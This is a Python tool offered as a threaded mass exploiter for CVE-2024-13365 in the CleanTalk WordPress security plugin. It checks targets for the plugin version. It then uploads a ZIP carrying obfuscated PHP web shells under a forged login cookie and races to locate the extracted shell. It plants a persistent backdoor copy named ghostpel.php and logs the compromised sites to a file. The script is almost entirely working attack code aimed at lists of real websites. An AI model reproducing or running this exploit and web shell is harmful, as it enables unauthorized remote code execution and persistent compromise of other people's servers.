#!/usr/bin/env python3
"""
CVE-2024-13365 - CleanTalk Security Plugin Mass Exploiter (THREADED)
Target: Security & Malware scan by CleanTalk <= 2.149

Features:
- Multi-threaded exploitation (5-50 threads)
- Pre-exploit vulnerability scanning
- Auto HTTP/HTTPS detection
- Single target or mass exploitation from file
- Minimal persistence (single ghostpel.php in tmp/)
- Auto-save working shells to file
- Real-time progress display
"""

import requests
import zipfile
import io
import time
import sys
import argparse
from urllib.parse import urljoin, urlparse, urlunparse
import datetime
import threading
import concurrent.futures
import os
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from queue import Queue

# Suppress SSL warnings
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

NUM_DUMMY_FILES = 2000

class Colors:
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'
    CLEAR_LINE = '\033[2K\r'

# Thread-safe printing
print_lock = threading.Lock()

def print_info(msg):
    with print_lock:
        print(f"{Colors.BLUE}[*]{Colors.END} {msg}")

def print_success(msg):
    with print_lock:
        print(f"{Colors.GREEN}[+]{Colors.END} {msg}")

def print_error(msg):
    with print_lock:
        print(f"{Colors.RED}[-]{Colors.END} {msg}")

def print_warning(msg):
    with print_lock:
        print(f"{Colors.YELLOW}[!]{Colors.END} {msg}")

# ==================== STATISTICS TRACKING ====================

class ExploitStats:
    """Thread-safe statistics tracking"""
    def __init__(self, total_targets):
        self.total = total_targets
        self.completed = 0
        self.success = 0
        self.failed = 0
        self.not_vulnerable = 0
        self.errors = 0
        self.lock = threading.Lock()
        self.start_time = time.time()

    def update(self, status):
        with self.lock:
            self.completed += 1
            if status == 'success':
                self.success += 1
            elif status == 'failed':
                self.failed += 1
            elif status == 'not_vulnerable':
                self.not_vulnerable += 1
            elif status == 'error':
                self.errors += 1

    def get_progress(self):
        with self.lock:
            elapsed = time.time() - self.start_time
            rate = self.completed / elapsed if elapsed > 0 else 0
            remaining = (self.total - self.completed) / rate if rate > 0 else 0

            return {
                'completed': self.completed,
                'total': self.total,
                'success': self.success,
                'failed': self.failed,
                'not_vulnerable': self.not_vulnerable,
                'errors': self.errors,
                'elapsed': elapsed,
                'rate': rate,
                'eta': remaining
            }

    def print_progress(self):
        """Print real-time progress"""
        progress = self.get_progress()

        percent = (progress['completed'] / progress['total'] * 100) if progress['total'] > 0 else 0

        eta_str = f"{int(progress['eta']//60)}m {int(progress['eta']%60)}s" if progress['eta'] < float('inf') else "N/A"

        status = (f"{Colors.CLEAR_LINE}"
                 f"{Colors.BOLD}[{progress['completed']}/{progress['total']}]{Colors.END} "
                 f"{Colors.GREEN}✓{progress['success']}{Colors.END} "
                 f"{Colors.RED}✗{progress['failed']}{Colors.END} "
                 f"{Colors.YELLOW}~{progress['not_vulnerable']}{Colors.END} "
                 f"| {percent:.1f}% | "
                 f"Rate: {progress['rate']:.1f}/s | "
                 f"ETA: {eta_str}")

        with print_lock:
            print(status, end='', flush=True)

# ==================== URL NORMALIZATION ====================

def normalize_url(url):
    """Normalize and auto-detect HTTP/HTTPS"""
    url = url.strip()

    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url

    parsed = urlparse(url)

    path = parsed.path if parsed.path else '/'
    if not path.endswith('/'):
        path += '/'

    normalized = urlunparse((
        parsed.scheme, parsed.netloc, path,
        parsed.params, parsed.query, parsed.fragment
    ))

    return normalized

def auto_detect_protocol(url, verify_ssl=False, timeout=5):
    """Auto-detect if target uses HTTP or HTTPS"""
    if url.startswith('http://'):
        url = url[7:]
    elif url.startswith('https://'):
        url = url[8:]

    # Try HTTPS first
    https_url = f"https://{url}"
    try:
        r = requests.head(https_url, timeout=timeout, verify=verify_ssl, allow_redirects=True)
        if r.status_code < 500:
            return normalize_url(https_url)
    except:
        pass

    # Fallback to HTTP
    http_url = f"http://{url}"
    try:
        r = requests.head(http_url, timeout=timeout, verify=verify_ssl, allow_redirects=True)
        if r.status_code < 500:
            return normalize_url(http_url)
    except:
        pass

    return normalize_url(https_url)

# ==================== PRE-EXPLOIT CHECKS ====================

def check_wordpress(target_url, verify_ssl=False):
    """Check if target is WordPress"""
    try:
        r = requests.get(
            urljoin(target_url, 'wp-login.php'),
            timeout=8,
            verify=verify_ssl,
            allow_redirects=True
        )

        if r.status_code == 200 and 'wp-login' in r.text.lower():
            return True

        r = requests.get(
            urljoin(target_url, 'wp-admin/'),
            timeout=8,
            verify=verify_ssl,
            allow_redirects=True
        )

        if 'wordpress' in r.text.lower() or 'wp-admin' in r.text.lower():
            return True

        return False

    except:
        return False

def check_plugin(target_url, verify_ssl=False):
    """Check if CleanTalk plugin is installed and get version"""
    plugin_paths = [
        'wp-content/plugins/security-malware-firewall/readme.txt',
        'wp-content/plugins/security-malware-firewall/',
        'wp-content/plugins/security-malware-firewall/css/cleantalk-security.css'
    ]

    for path in plugin_paths:
        try:
            r = requests.get(
                urljoin(target_url, path),
                timeout=8,
                verify=verify_ssl,
                allow_redirects=False
            )

            if r.status_code == 200:
                if 'readme.txt' in path and 'Stable tag:' in r.text:
                    for line in r.text.split('\n'):
                        if 'Stable tag:' in line:
                            version = line.split(':')[1].strip()
                            try:
                                version_num = float(version)
                                return {
                                    'installed': True,
                                    'version': version,
                                    'vulnerable': version_num <= 2.149
                                }
                            except:
                                return {
                                    'installed': True,
                                    'version': version,
                                    'vulnerable': None
                                }

                return {
                    'installed': True,
                    'version': 'unknown',
                    'vulnerable': None
                }

        except:
            continue

    return {
        'installed': False,
        'version': None,
        'vulnerable': False
    }

def check_upload_endpoint(target_url, verify_ssl=False):
    """Check if upload endpoint is accessible"""
    try:
        r = requests.get(
            urljoin(target_url, 'wp-admin/media-new.php'),
            timeout=8,
            verify=verify_ssl,
            allow_redirects=False
        )

        return r.status_code in [200, 302]

    except:
        return False

def vulnerability_scan(target_url, verify_ssl=False):
    """Quick vulnerability scan"""
    results = {
        'wordpress': False,
        'plugin_installed': False,
        'plugin_version': None,
        'vulnerable': False,
        'upload_accessible': False,
        'likely_exploitable': False
    }

    # Check WordPress
    results['wordpress'] = check_wordpress(target_url, verify_ssl)

    if not results['wordpress']:
        return results

    # Check CleanTalk plugin
    plugin_info = check_plugin(target_url, verify_ssl)

    results['plugin_installed'] = plugin_info['installed']
    results['plugin_version'] = plugin_info['version']
    results['vulnerable'] = plugin_info['vulnerable']

    if not plugin_info['installed']:
        return results

    # Check upload endpoint
    results['upload_accessible'] = check_upload_endpoint(target_url, verify_ssl)

    # Determine if likely exploitable
    results['likely_exploitable'] = (
        results['wordpress'] and
        results['plugin_installed'] and
        (results['vulnerable'] if results['vulnerable'] is not None else True)
    )

    return results

# ==================== GHOST PERSISTENCE ====================

class GhostShellPersistence:
    """Minimal stealth persistence"""

    @staticmethod
    def execute_cmd(shell_url, command, timeout=10, verify_ssl=False):
        """Execute command via webshell"""
        try:
            import urllib.parse
            encoded_cmd = urllib.parse.quote(command)
            target_url = f"{shell_url}?c={encoded_cmd}"

            response = requests.get(target_url, timeout=timeout,
                                   verify=verify_ssl, allow_redirects=False)
            if response.status_code == 200:
                output = response.text.replace('<pre>', '').replace('</pre>', '')
                return output.strip()
        except:
            pass
        return None

    @staticmethod
    def test_shell(url, timeout=5, verify_ssl=False):
        """Test if shell is working"""
        try:
            test_token = f"GHOST{int(time.time())}"
            test_url = f"{url}?c=echo+{test_token}"

            resp = requests.get(test_url, timeout=timeout,
                              verify=verify_ssl, allow_redirects=False)

            if resp.status_code == 200 and test_token in resp.text:
                return True
        except:
            pass
        return False

    @staticmethod
    def install_ghost(shell_url, verify_ssl=False):
        """Install ghostpel.php in tmp/ directory"""

        parsed = urlparse(shell_url)
        path_parts = parsed.path.split('/')

        spbct_index = -1
        for i, part in enumerate(path_parts):
            if 'spbct_' in part:
                spbct_index = i
                break

        if spbct_index == -1:
            return None

        parent_parts = path_parts[:spbct_index]
        parent_path = '/'.join(parent_parts) + '/'
        parent_url = f"{parsed.scheme}://{parsed.netloc}{parent_path}"

        shell_filename = path_parts[-1]

        commands = [
            "mkdir -p ../../tmp 2>/dev/null",
            f"cp {shell_filename} ../../tmp/ghostpel.php"
        ]

        for cmd in commands:
            GhostShellPersistence.execute_cmd(shell_url, cmd, verify_ssl=verify_ssl)

        ghost_url = f"{parent_url}tmp/ghostpel.php"

        time.sleep(1)

        if GhostShellPersistence.test_shell(ghost_url, verify_ssl=verify_ssl):
            return ghost_url

        return None

# ==================== EXPLOIT ENGINE ====================

def create_payload():
    """Generate malicious ZIP payload"""
    zip_buffer = io.BytesIO()

    shell_code = """<?php
$x=base64_decode('c3lzdGVt');
if(isset($_GET['c'])){ echo "<pre>"; $x($_GET['c']); echo "</pre>"; die; }
?>"""

    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
        zip_file.writestr("images/logo.php", shell_code)
        zip_file.writestr("css/style.php", shell_code)

        for i in range(NUM_DUMMY_FILES):
            zip_file.writestr(f"logs/deep/folder/v1/log_{i}.txt", "A" * 100)

    return zip_buffer.getvalue()

def check_url_worker(url, verify_ssl, stop_flag):
    """Check if URL is accessible"""
    if stop_flag['stop']:
        return None

    try:
        r = requests.get(url, timeout=2, verify=verify_ssl, allow_redirects=False)
        if r.status_code == 200:
            return url
    except:
        pass
    return None

def uploader_thread(target_url, method_data, cookies, payload, verify_ssl):
    """Upload malicious ZIP"""
    try:
        requests.request(
            method_data['method'],
            urljoin(target_url, method_data['url']),
            files=method_data['files'],
            data=method_data['data'],
            cookies=cookies,
            timeout=30,
            verify=verify_ssl,
            allow_redirects=False
        )
    except:
        pass

def scanner_engine(target_url, timestamp_start, verify_ssl, stop_flag, result_dict):
    """Race condition scanner"""

    now = datetime.datetime.now()
    year = now.strftime("%Y")
    month = now.strftime("%m")

    base_patterns = [
        f"wp-content/uploads/{year}/{month}/spbct_{{ts}}",
        f"wp-content/uploads/spbct_{{ts}}"
    ]

    filenames = ["images/logo.php", "css/style.php"]

    start_time = time.time()

    while time.time() - start_time < 20:
        if stop_flag['stop']:
            break

        current_urls = []
        ts_center = int(time.time())

        for t in range(ts_center - 8, ts_center + 8):
            for base in base_patterns:
                base_filled = base.format(ts=t)
                for fname in filenames:
                    full_url = urljoin(target_url, f"{base_filled}/{fname}")
                    current_urls.append(full_url)

        with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
            future_to_url = {
                executor.submit(check_url_worker, url, verify_ssl, stop_flag): url
                for url in current_urls
            }

            for future in concurrent.futures.as_completed(future_to_url):
                res = future.result()
                if res:
                    try:
                        verify = requests.get(f"{res}?c=echo+PWNED", timeout=3,
                                            verify=verify_ssl)
                        if "PWNED" in verify.text:
                            result_dict['shell_url'] = res
                            stop_flag['stop'] = True
                            return
                    except:
                        pass

        time.sleep(0.15)

def exploit_single_target(target_url, verify_ssl=False, skip_scan=False):
    """Exploit single target with pre-checks"""

    # Auto-detect protocol
    try:
        target_url = auto_detect_protocol(target_url, verify_ssl, timeout=5)
    except:
        return {
            'status': 'error',
            'target': target_url,
            'shell': None,
            'ghost': None,
            'error': 'Connection timeout'
        }

    # Vulnerability scan
    if not skip_scan:
        scan_results = vulnerability_scan(target_url, verify_ssl)

        if not scan_results['likely_exploitable']:
            return {
                'status': 'not_vulnerable',
                'target': target_url,
                'shell': None,
                'ghost': None,
                'scan': scan_results
            }

    # Generate payload
    payload_data = create_payload()

    cookies = {'wordpress_logged_in_hack': '1'}

    target_endpoint = {
        'url': 'wp-admin/media-new.php',
        'method': 'POST',
        'data': {},
        'files': {'async-upload': ('update.zip', payload_data, 'application/zip')}
    }

    # Shared state for threads
    stop_flag = {'stop': False}
    result_dict = {'shell_url': None}

    # Launch attack
    t_upload = threading.Thread(
        target=uploader_thread,
        args=(target_url, target_endpoint, cookies, payload_data, verify_ssl)
    )

    timestamp_estimate = int(time.time())

    t_scan = threading.Thread(
        target=scanner_engine,
        args=(target_url, timestamp_estimate, verify_ssl, stop_flag, result_dict)
    )

    t_upload.start()
    time.sleep(0.25)
    t_scan.start()

    t_scan.join(timeout=25)  # Max wait time
    stop_flag['stop'] = True

    if result_dict['shell_url']:
        # Install ghost persistence
        ghost_url = GhostShellPersistence.install_ghost(result_dict['shell_url'], verify_ssl)

        return {
            'status': 'success',
            'target': target_url,
            'shell': result_dict['shell_url'],
            'ghost': ghost_url,
            'scan': scan_results if not skip_scan else None
        }

    return {
        'status': 'failed',
        'target': target_url,
        'shell': None,
        'ghost': None,
        'scan': scan_results if not skip_scan else None
    }

# ==================== THREADED EXPLOITATION ====================

def worker_exploit(target_queue, results_queue, stats, verify_ssl, skip_scan):
    """Worker thread for exploitation"""
    while True:
        try:
            target = target_queue.get(timeout=1)
            if target is None:
                break

            result = exploit_single_target(target, verify_ssl, skip_scan)

            results_queue.put(result)
            stats.update(result['status'])

            target_queue.task_done()

        except Exception as e:
            if target:
                results_queue.put({
                    'status': 'error',
                    'target': target,
                    'shell': None,
                    'ghost': None,
                    'error': str(e)
                })
                stats.update('error')

def threaded_exploitation(targets, num_threads, verify_ssl, skip_scan, output_file):
    """Main threaded exploitation engine"""

    target_queue = Queue()
    results_queue = Queue()

    # Fill queue
    for target in targets:
        target_queue.put(target)

    # Initialize stats
    stats = ExploitStats(len(targets))

    # Start worker threads
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(
            target=worker_exploit,
            args=(target_queue, results_queue, stats, verify_ssl, skip_scan)
        )
        t.daemon = True
        t.start()
        threads.append(t)

    # Progress display thread
    def display_progress():
        while stats.completed < stats.total:
            stats.print_progress()
            time.sleep(0.5)
        stats.print_progress()
        print()  # New line after completion

    progress_thread = threading.Thread(target=display_progress)
    progress_thread.daemon = True
    progress_thread.start()

    # Wait for completion
    target_queue.join()

    # Stop workers
    for _ in range(num_threads):
        target_queue.put(None)

    for t in threads:
        t.join()

    # Collect results
    results = []
    while not results_queue.empty():
        results.append(results_queue.get())

    return results, stats

# ==================== MAIN PROGRAM ====================

def load_targets_from_file(filepath):
    """Load targets from file"""
    targets = []
    try:
        with open(filepath, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    targets.append(line)
        return targets
    except FileNotFoundError:
        print_error(f"File not found: {filepath}")
        sys.exit(1)

def save_results(results, output_file):
    """Save exploitation results to file"""
    try:
        with open(output_file, 'w') as f:
            f.write("# CVE-2024-13365 Exploitation Results\n")
            f.write(f"# Generated: {datetime.datetime.now()}\n\n")

            for result in results:
                if result['status'] == 'success' and result['ghost']:
                    f.write(f"{result['ghost']}\n")

        print_success(f"Results saved to: {output_file}")
    except Exception as e:
        print_error(f"Failed to save results: {e}")

def main():
    parser = argparse.ArgumentParser(
        description="CVE-2024-13365 Multi-Threaded Mass Exploiter",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Single target
  python3 %(prog)s

  # Mass exploitation with 20 threads
  python3 %(prog)s -t 20

  # Fast mode (skip pre-checks)
  python3 %(prog)s --skip-scan -t 30

  # Maximum speed
  python3 %(prog)s --skip-scan -t 50 --verify-ssl
        """
    )

    parser.add_argument("-t", "--threads", type=int, default=10,
                       help="Number of threads (default: 10, max: 50)")
    parser.add_argument("--verify-ssl", action="store_true",
                       help="Enable SSL certificate verification")
    parser.add_argument("--skip-scan", action="store_true",
                       help="Skip pre-exploitation vulnerability scan (faster)")
    parser.add_argument("-o", "--output", default="ghostshells.txt",
                       help="Output file for successful shells (default: ghostshells.txt)")

    args = parser.parse_args()

    # Validate threads
    if args.threads < 1:
        args.threads = 1
    elif args.threads > 50:
        print_warning(f"Maximum threads is 50, using 50 instead of {args.threads}")
        args.threads = 50

    print(f"""
{Colors.BOLD}╔════════════════════════════════════════════════════╗
║  CVE-2024-13365 - Threaded Ghost Shell Exploiter  ║
║  Ghostpel - heheheh                               ║
║  Mode: Multi-Threaded ({args.threads} threads)                     ║
╚════════════════════════════════════════════════════╝{Colors.END}
    """)

    # Ask for input mode
    print("Select input mode:")
    print("  1. Single URL")
    print("  2. File containing URLs")

    while True:
        choice = input(f"\n{Colors.BLUE}[?]{Colors.END} Enter choice (1/2): ").strip()
        if choice in ['1', '2']:
            break
        print_error("Invalid choice. Please enter 1 or 2.")

    targets = []
    is_mass_mode = False

    if choice == '1':
        url = input(f"{Colors.BLUE}[?]{Colors.END} Enter target URL: ").strip()
        if not url:
            print_error("URL cannot be empty!")
            sys.exit(1)
        targets = [url]
    else:
        is_mass_mode = True
        filepath = input(f"{Colors.BLUE}[?]{Colors.END} Enter file path: ").strip()
        if not filepath:
            print_error("File path cannot be empty!")
            sys.exit(1)
        targets = load_targets_from_file(filepath)
        print_info(f"Loaded {len(targets)} targets from file")

    # Confirm
    scan_status = "DISABLED (FAST)" if args.skip_scan else "ENABLED"
    print(f"\n{Colors.YELLOW}Configuration:{Colors.END}")
    print(f"  Targets: {len(targets)}")
    print(f"  Threads: {args.threads}")
    print(f"  Pre-scan: {scan_status}")
    print(f"  SSL Verify: {args.verify_ssl}")

    confirm = input(f"\n{Colors.BLUE}[?]{Colors.END} Continue? (y/n): ").strip().lower()

    if confirm != 'y':
        print("Aborted.")
        sys.exit(0)

    print("\n" + "="*60)
    print("Starting exploitation...")
    print("="*60 + "\n")

    # Run threaded exploitation
    if is_mass_mode and len(targets) > 1:
        results, stats = threaded_exploitation(
            targets,
            args.threads,
            args.verify_ssl,
            args.skip_scan,
            args.output
        )
    else:
        # Single target mode (no threading)
        print_info(f"Target: {targets[0]}")
        result = exploit_single_target(targets[0], args.verify_ssl, args.skip_scan)
        results = [result]
        stats = ExploitStats(1)
        stats.update(result['status'])

    # Summary
    progress = stats.get_progress()

    print("\n" + "="*60)
    print(f"{Colors.BOLD}EXPLOITATION SUMMARY{Colors.END}")
    print("="*60)
    print(f"Total Targets: {progress['total']}")
    print(f"{Colors.GREEN}Successful: {progress['success']}{Colors.END}")
    print(f"{Colors.RED}Failed: {progress['failed']}{Colors.END}")
    print(f"{Colors.YELLOW}Not Vulnerable: {progress['not_vulnerable']}{Colors.END}")
    print(f"Errors: {progress['errors']}")
    print(f"Time Elapsed: {int(progress['elapsed']//60)}m {int(progress['elapsed']%60)}s")
    if progress['rate'] > 0:
        print(f"Average Rate: {progress['rate']:.2f} targets/sec")
    print("="*60 + "\n")

    # Save results
    if progress['success'] > 0:
        if is_mass_mode:
            save_results(results, args.output)
            print_info(f"Successfully compromised {progress['success']} target(s)")
            print_info(f"Ghost shells saved to: {args.output}")
        else:
            ghost_shell = next((r['ghost'] for r in results if r['ghost']), None)
            if ghost_shell:
                print_success(f"\nGhost Shell URL: {ghost_shell}")
                print_info(f"Usage: curl \"{ghost_shell}?c=<command>\"")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\nExiting...")
        sys.exit(0)
